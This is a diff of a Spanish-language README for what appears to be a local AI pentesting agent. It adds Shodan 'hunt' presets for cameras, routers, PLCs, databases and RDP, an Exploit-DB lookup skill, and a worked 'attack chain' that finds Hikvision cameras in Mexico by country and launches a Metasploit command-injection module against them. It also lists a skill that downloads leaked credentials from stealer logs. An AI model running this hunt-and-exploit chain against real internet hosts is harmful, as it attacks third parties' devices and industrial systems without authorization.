@@ -10,7 +10,7 @@
 ![Ollama](https://img.shields.io/badge/Ollama-local-000000?style=for-the-badge&logo=ollama&logoColor=white)
 ![Flask](https://img.shields.io/badge/Web_UI-Flask-000000?style=for-the-badge&logo=flask&logoColor=white)
 ![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
-![Skills](https://img.shields.io/badge/skills-22-F7768E?style=for-the-badge)
+![Skills](https://img.shields.io/badge/skills-24-F7768E?style=for-the-badge)
 ![Multiagente](https://img.shields.io/badge/multi--agente-SubAgents-BB9AF7?style=for-the-badge)
 ![License](https://img.shields.io/badge/license-MIT-9ECE6A?style=for-the-badge)
 
@@ -18,7 +18,7 @@
 
 <div align="center">
 
-### 🧠 IA local (Ollama) · ⚡ 22 skills · 🌐 Web UI · 🔬 RE + bypass · 🕸️ web dinámico · 🔑 credential intel · 🛠️ dev de código
+### 🧠 IA local (Ollama) · ⚡ 24 skills · 🌐 Web UI · 🔬 RE + bypass · 🕸️ web dinámico · 🔑 credential intel · 🛠️ dev de código
 
 </div>
 
@@ -46,6 +46,8 @@
 | 💾 | **Persistencia** — dominios, hallazgos y sesiones se acumulan por proyecto |
 | 📊 | **Reportes** — HTML dark-theme con gráficos + Markdown |
 | 🌐 | **Web UI** — interfaz gráfica con chat, proyectos, skills y dashboard de vulnerabilidades |
+| 🔭 | **Shodan Hunt** — busca cámaras, routers, PLCs, bases de datos expuestas y encadena exploits automáticamente |
+| 💣 | **Exploit-DB** — `searchsploit` local + exploit-db.com; sugiere módulos Metasploit por CVE/producto |
 | 🏢 | **AD Audit** — escanea DCs y audita LDAP, SMB, Kerberos y más |
 
 </div>
@@ -54,7 +56,7 @@
 
 ## 🌐 Web UI — `python agent.py --web`
 
-> **NUEVO** — Interfaz web completa tipo Claude, sin instalar nada extra (Flask se instala solo).
+> **NUEVO** — Interfaz web completa y animada tipo SPA (Single Page Application) sin dependencias complejas (Flask se encarga del backend). Diseñada con estética premium oscura, *glassmorphism* y animaciones dinámicas.
 
 ```bash
 python agent.py --web              # http://127.0.0.1:7860 (abre navegador automáticamente)
@@ -66,14 +68,16 @@ python agent.py --web --host 0.0.0.0 --port 7860  # accesible desde la LAN
 
 | Feature | Descripción |
 |:--------|:------------|
-| 💬 **Chat en tiempo real** | Streaming token a token desde Ollama (igual que Claude) |
-| 📁 **Multi-proyecto** | Crea proyectos, especifica carpeta del SO, gestiona desde el navegador |
-| 🗨️ **Multi-chat** | Varias sesiones de conversación por proyecto, historial persistente |
-| ⚙️ **Toggle de skills** | Activa/desactiva skills por sesión con interruptores visuales |
-| 📊 **Dashboard** | Tarjetas por severidad + tabla filtrable de hallazgos + subdominios |
-| 📎 **Upload de archivos** | Sube archivos y se inyectan en el contexto del agente |
-| 🤖 **Selector de modelos** | Lista de modelos Ollama con ranking automático |
-| ⌨️ **Historial** | Ver comandos ejecutados con output expandible |
+| ✨ **Diseño Animado** | Fondo dinámico de partículas, efectos *glassmorphism* y micro-animaciones fluidas |
+| 💬 **Chat interactivo** | Streaming token a token, avatares, modo "pensando..." (thinking block) y renderizado de Markdown/Código |
+| 📁 **Multi-proyecto** | Crea proyectos (especificando carpeta destino custom), gestione desde el panel lateral izquierdo |
+| 🗨️ **Multi-chat** | Múltiples sesiones paralelas por proyecto, historial persistente y selector rápido |
+| ⚙️ **Panel de Skills** | Toggle visual para encender/apagar skills (Active Directory, Vuln Scans, etc) al vuelo |
+| 📊 **Dashboard Visual** | Panel con tarjetas de severidad coloreadas, contador de vulnerabilidades, subdominios descubiertos e indicadores |
+| 📎 **Upload de archivos** | Sube múltiples archivos (arrastrando o seleccionando) que se inyectan en el contexto de Ollama |
+| 🤖 **Gestión de Modelos** | Selector de modelos locales en tiempo real con indicador de estado (Online/Offline) |
+| ⌨️ **Historial Ejecutable** | Visor de output crudo que recopila los comandos lanzados en la sesión actual |
+| ⚡ **Slash Command Menu** | Escribe `/` para abrir menú de 22+ comandos rápidos con filtrado y navegación por teclado |
 
 </div>
 
@@ -156,7 +160,7 @@ BROWSER="firefox"
 |:------|:---------:|:---------|
 | `crtsh_enum` | 🔍 recon pasivo | Subdominios vía Certificate Transparency |
 | `google_dorks` | 🔍 recon pasivo | Google dorks de seguridad |
-| `shodan_query` | 🔍 recon pasivo | Shodan API + InternetDB fallback |
+| `shodan_query` | 🔍 recon pasivo | Shodan v2: host lookup + **hunt** por device_type (40+ presets) · CVE→MSF |
 | `subfinder_enum` | 🔍 recon pasivo | Subfinder + verificación HTTP (httpx) |
 | `whiteintel` | 🔍 recon pasivo | Descarga credenciales filtradas de stealer logs |
 | `whiteintel_num` | 🔍 recon pasivo | API WhiteIntel.io — consulta creds expuestas por dominio/empresa |
@@ -166,6 +170,7 @@ BROWSER="firefox"
 | `wpscan_run` | 🎯 vuln scan | WPScan con API key automática |
 | `sqli_scan` | 🎯 vuln scan | Detecta **y extrae** SQLi con sqlmap (+ fallback) |
 | `web_attack` | 🎯 vuln scan | Pentest web dinámico: SQLi/XSS/LFI/redirect/cmdi |
+| ✨ `exploit_db` | 🎯 vuln scan | Busca exploits en **Exploit-DB** (searchsploit + web) · genera comandos MSF |
 | ✨ `ad_audit` | 🎯 vuln scan | **AD Scanner**: LDAP anónimo, SMB signing, Kerberos, LDAPS, GC |
 | `spider_code` | 🔬 análisis | Spider HTML/JS: secretos, creds, source maps |
 | `web_code` | 🔬 análisis | Análisis profundo: framework, Firebase, endpoints, GraphQL |
@@ -177,7 +182,7 @@ BROWSER="firefox"
 | `model_advisor` | 🛠️ desarrollo | Recomienda modelo Ollama **+ prepara el toolchain** del lenguaje |
 | `code_dev` | 🛠️ desarrollo | Desarrolla código (pipenv + linters) → `out/<proj>/dev/` |
 
-<sub>✨ = nuevo en esta versión</sub>
+<sub>✨ = nuevo en esta versión · Total: 24 skills</sub>
 
 </div>
 
@@ -215,6 +220,39 @@ SKILL:ad_audit target=10.10.0.0/24 timeout=1.5 threads=50
 - SMB2 raw socket NEGOTIATE con 3 reintentos y backoff
 - Verificación de certificado LDAPS (válido / self-signed / expirado)
 - Auto-install de `ldap3` y `dnspython`
+
+---
+
+## 🔭 Shodan Hunt + Exploit-DB — cadena de ataque
+
+> **NUEVO** — `shodan_query` v2 añade modo **search/hunt** con 40+ presets de dispositivos y cruce automático con Exploit-DB y Metasploit.
+
+```bash
+# 1. Busca cámaras Hikvision en México
+SKILL:shodan_query device_type=hikvision country=MX limit=20
+
+# 2. Para cada CVE encontrado, busca exploits
+SKILL:exploit_db cve=CVE-2021-36260
+
+# 3. Lanza el exploit
+SKILL:metasploit mode=exploit target=<ip> module=exploit/linux/http/hikvision_cmd_injection lhost=<lhost>
+```
+
+<div align="center">
+
+| Preset `device_type` | Categoría | Dorks que genera |
+|:---------------------|:---------:|:----------------|
+| `camera` · `hikvision` · `dahua` · `rtsp` · `dvr` | 📷 Cámaras | `port:554`, `title:"IP Camera"`, `product:"Hikvision"` |
+| `router` · `mikrotik` · `cisco` · `ubiquiti` | 🌐 Redes | `os:"RouterOS"`, `product:"Cisco IOS"` |
+| `industrial` · `scada` · `plc` · `modbus` · `siemens` | 🏭 OT/ICS | `port:102`, `port:502`, `port:47808` |
+| `mongodb` · `redis` · `elasticsearch` · `mysql` · `postgres` | 🗄️ Bases de datos | `port:27017`, `port:6379 -auth` |
+| `rdp` · `vnc` · `telnet` · `winrm` | 💻 Acceso remoto | `port:3389`, `port:5900` |
+| `jenkins` · `phpmyadmin` · `panel` · `wordpress` | 🔑 Paneles | `title:"Jenkins"`, `http.status:200` |
+| `nas` · `printer` · `voip` · `iot` · `solar` | 📡 IoT/Misc | `port:1883`, `title:"Synology"` |
+
+</div>
+
+`exploit_db` busca en **Exploit-DB** por término, CVE, producto o EDB-ID y genera comandos `SKILL:metasploit` listos para ejecutar. Prioriza `searchsploit` local y cae al endpoint web como fallback.
 
 ---
 
@@ -285,6 +323,15 @@ model_advisor → modelo + toolchain
 apk_analyze <app.apk>
    └─ apk_dynamic action=ssl-unpin
         └─ apk_dynamic action=hook
+```
+
+**🔭 Shodan Hunt → Exploit**
+```text
+shodan_query device_type=hikvision country=MX
+   └─ CVE-2021-36260 detectado →
+exploit_db cve=CVE-2021-36260
+   └─ EDB-50512 → SKILL:metasploit
+        module=exploit/linux/http/hikvision_cmd_injection
 ```
 
 </td>
@@ -384,6 +431,17 @@ hacker ❯ bypass el login de /home/kali/reto/vault_bin
 hacker ❯ listame vulnerabilidades
 hacker ❯ explotar 3
 hacker ❯ reporte
+
+# Shodan hunt + exploit-db + metasploit
+hacker ❯ SKILL:shodan_query device_type=hikvision country=MX limit=20
+hacker ❯ SKILL:shodan_query device_type=rdp country=US limit=50
+hacker ❯ SKILL:exploit_db cve=CVE-2021-36260
+hacker ❯ SKILL:exploit_db search=hikvision
+hacker ❯ SKILL:exploit_db product=apache version=2.4.49
+
+# Web UI — slash menu
+# Escribe / en el chat para desplegar comandos rápidos
+# /hackea · /cameras · /nuclei · /sqli · /exploitdb · /msf · /bypass · /ad …
 ```
 
 ---
